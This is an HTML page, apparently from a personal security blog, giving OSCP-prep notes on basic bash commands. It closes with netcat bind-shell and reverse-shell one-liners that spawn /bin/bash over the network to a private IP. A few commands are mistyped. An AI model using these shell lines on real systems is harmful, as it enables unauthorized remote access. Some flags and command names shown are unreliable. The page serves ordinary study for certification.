@@ -1,0 +1,216 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    
+    <title>OSCP bash module // B0YK4</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.68.3" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Mohamed Abd Elsattar" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://b0yk4.github.io/css/main.min.c69086131f3c165707b92a8a9f7bb02328e1aace76a4a1f205736e4987ea5363.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="OSCP bash module"/>
+<meta name="twitter:description" content="#### commands info man ls # manual and all &#34;ls&#34; info whatis ls # quit description for what is ls apropos list # search what tool to do this function whoami sudo adduser mohamed # add user usermod -aG sudo mohamed # add sudo user shasum file # see file hashing pkg -i &#39;***&#39; # install package apt remove &#39;pkg&#39;	# remove programe package apt remove --purge &#39;pkg&#39; # remove package configiration # search locate rockyou."/>
+
+    <meta property="og:title" content="OSCP bash module" />
+<meta property="og:description" content="#### commands info man ls # manual and all &#34;ls&#34; info whatis ls # quit description for what is ls apropos list # search what tool to do this function whoami sudo adduser mohamed # add user usermod -aG sudo mohamed # add sudo user shasum file # see file hashing pkg -i &#39;***&#39; # install package apt remove &#39;pkg&#39;	# remove programe package apt remove --purge &#39;pkg&#39; # remove package configiration # search locate rockyou." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://b0yk4.github.io/posts/oscp/oscp_bash/" />
+<meta property="article:published_time" content="2021-08-23T14:53:32+02:00" />
+<meta property="article:modified_time" content="2021-08-23T14:53:32+02:00" />
+
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons"
+      rel="stylesheet">
+  </head>
+  <body>
+    
+    <header class="app-header">
+      <a href="https://b0yk4.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Mohamed Abd Elsattar" /></a>
+      <h1>B0YK4</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+      </nav>
+      <p>Cyber Security blog and CTFs writeups </p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/b0yk4" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/mo-boyka/" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>Linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/m0_boyka" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+<div class="app-new-header">
+  
+  
+  <h2><a  href="#" onclick="goBack()" > <i class="material-icons"  >arrow_back_ios_new</i>  </a> OSCP bash module</h2>
+  
+  <hr >
+  </div>
+  
+    <main class="app-container">
+
+
+      
+  <article class="post">
+    <header class="post-header">
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Aug 23, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          3 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://b0yk4.github.io/tags/bash/">bash</a>
+              <a class="tag" href="https://b0yk4.github.io/tags/oscp/">OSCP</a>
+              <a class="tag" href="https://b0yk4.github.io/tags/bash/">bash</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e">#### commands info</span>
+man ls 			    <span style="color:#75715e"># manual and all &#34;ls&#34; info</span>
+whatis ls 		    <span style="color:#75715e"># quit description for what is ls</span> 
+apropos list        		<span style="color:#75715e"># search what tool to do this function</span>
+whoami
+sudo adduser mohamed 		<span style="color:#75715e"># add user</span>
+usermod -aG sudo mohamed 	<span style="color:#75715e"># add sudo user</span>
+shasum  file 				<span style="color:#75715e"># see file hashing</span>
+
+pkg -i  <span style="color:#e6db74">&#39;***&#39;</span> 				<span style="color:#75715e"># install package</span>
+apt remove <span style="color:#e6db74">&#39;pkg&#39;</span>				<span style="color:#75715e"># remove programe package</span>
+apt remove --purge <span style="color:#e6db74">&#39;pkg&#39;</span> 		<span style="color:#75715e"># remove package configiration</span>
+
+<span style="color:#75715e"># search</span>
+locate rockyou.txt
+find . -name data.txt -type f -size 33c -user boyka -executable -exec file +<span style="color:#f92672">{}</span> | grep <span style="color:#e6db74">&#34;boyka&#34;</span>
+
+<span style="color:#75715e"># &#39;&lt;&#39; 0 STDIN &#39;&gt;&#39; 1 STDOUT &#39;2&gt;&#39; STDERR</span>
+echo <span style="color:#e6db74">&#34;boyka&#34;</span> &gt; boyka.txt        <span style="color:#75715e"># &gt;&gt; for write on newline</span>
+cat boyka.txt | tee nex.txt     <span style="color:#75715e"># write with printing on screen</span>
+cat &lt; boyka.txt
+rm * 2&gt; /dev/null
+ls | xargs rm 					<span style="color:#75715e"># == rm *</span>
+
+<span style="color:#75715e"># get regular expression &#39;grep&#39;</span> 
+grep <span style="color:#e6db74">&#34;text&#34;</span> file.txt <span style="color:#f92672">===</span> cat file.txt | grep <span style="color:#e6db74">&#34;text&#34;</span>      <span style="color:#75715e">#search for text in file.txt</span>
+grep -i -v text file.txt                                 <span style="color:#75715e"># -i ignore lower and upper and find all match -v print the opposite</span>
+grep t..t file.txt   			<span style="color:#75715e"># search by regex</span>
+grep te* file.txt 
+
+<span style="color:#75715e"># stream editor</span>
+sed <span style="color:#e6db74">&#39;s/boyka/mohamed/&#39;</span> file.txt &gt; new  <span style="color:#75715e"># s for substitute boyka/mohamed</span>
+sed <span style="color:#e6db74">&#39;s/boyka/mohamed/g&#39;</span> file.txt &gt; new <span style="color:#75715e"># g for global ..means all words match in the line</span>
+
+<span style="color:#75715e"># split for divide file data in subfiles</span>
+split -l <span style="color:#ae81ff">100</span> file new_             <span style="color:#75715e"># this will split every 100 line in &#39;file&#39; into separate file new_aa new_ab new_ac ...</span>
+
+head file						<span style="color:#75715e"># print first 10 lines by defult</span> 
+tail file						<span style="color:#75715e"># last 10 by defult</span> 
+-f 								<span style="color:#75715e"># for follow and print any changing</span>
+
+<span style="color:#75715e"># cut and replace by delimeter</span>
+cut -d <span style="color:#e6db74">&#34; &#34;</span> -f <span style="color:#ae81ff">2</span> file            <span style="color:#75715e"># -d for delimeter &#39;\t&#39; by defult -f for field -b for byte</span>
+
+<span style="color:#75715e"># awk options &#39;selection _criteria {action }&#39; input-file &gt; output-file</span>
+cut -d <span style="color:#e6db74">&#34;:&#34;</span> file |awk <span style="color:#f92672">{</span>print $1,$2<span style="color:#f92672">}</span> <span style="color:#75715e"># = cut -d &#34;:&#34; -f 1,2</span>
+
+<span style="color:#75715e"># comparing files</span>
+comm file1 file2
+comm -1 file1 file2            <span style="color:#75715e">#show without column 1</span> 
+----------------
+diff file1 file2               <span style="color:#75715e">#this command compares line by line with more options</span>
+
+<span style="color:#75715e"># process management</span>
+ps aux 						    <span style="color:#75715e"># process manager</span>
+sleep 1000&amp; 				    <span style="color:#75715e"># &amp; for run in background</span>
+nohup sleep 1000&amp; 				<span style="color:#75715e"># &#39;no hang up&#39; active if bash session closed</span>
+jobs 							<span style="color:#75715e"># show shell jobs</span>
+fg 								<span style="color:#75715e"># show a job for ground</span>
+bg 								<span style="color:#75715e"># move a job in background</span>
+disown                       	<span style="color:#75715e"># for make a process nohup</span>
+kill id                         <span style="color:#75715e"># kill process -1 for kil with hup signal -2 for iterrupt -9 aggressive killing</span> 
+killall sleep 					<span style="color:#75715e"># kill all sleep processes</span>
+pikill sle 						<span style="color:#75715e"># will all begins with sle</span>
+
+<span style="color:#75715e"># follow and watch process or file changing</span>
+watch free 						<span style="color:#75715e"># free shows memory usage and watch follows changing</span>
+watch -n 0.5 -d free 			<span style="color:#75715e"># watch every 0.5 second and -d for highlight the diffrence</span>
+watch -n 0.5 -d df 				<span style="color:#75715e"># disk format</span> 
+
+<span style="color:#75715e"># downloading files</span>
+wget url
+curl url -o name
+axel							<span style="color:#75715e"># better for large files -n provide multi connections</span>
+git clone 						<span style="color:#75715e"># for github</span>
+
+<span style="color:#75715e"># Bash History Customization</span>
+export HISTIGNORE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&amp;:ls:[bf]g:exit:history&#34;</span>  	<span style="color:#75715e">#ignore saving commands in history</span>
+.bashrc  										<span style="color:#75715e">#.bashrc script is executed any time that user logs in</span>
+alias l<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ls -lah&#34;</span>								<span style="color:#75715e"># Aliases are useful for replacing commonly-used commands and switches with a shorter command</span>
+nualias  l
+
+<span style="color:#75715e"># net cat for connecting and transfering data via tcp/udp</span>
+<span style="color:#75715e">#  -n option to disable DNS name resolution, -l to create a listener, -v to add some verbosity, and -p to specify the listening port number</span>
+nc -vnp 192.168.1.3 <span style="color:#ae81ff">4444</span> 		<span style="color:#75715e"># connect server ip and port</span>
+nc -nlvp <span style="color:#ae81ff">4444</span> 					<span style="color:#75715e"># server listen on port 4444</span> 
+nc -vnp 192.168.1.3 <span style="color:#ae81ff">4444</span> &lt; data.txt <span style="color:#75715e">#sending file</span>
+nc -nlvp <span style="color:#ae81ff">4444</span> &gt; new 				<span style="color:#75715e">#receiving data</span> 
+<span style="color:#75715e"># Netcat Bind Shell Scenario</span>
+nc -nlvp <span style="color:#ae81ff">4444</span> -e /bin/bash 		<span style="color:#75715e">#-e option works on kali nc</span>
+<span style="color:#75715e"># Reverse Shell Scenario</span>
+nc -vnp 192.168.1.3 <span style="color:#ae81ff">4444</span> -e /bin/bash
+</code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
+<script>
+  function goBack() {
+    window.history.back();
+  }
+  </script>
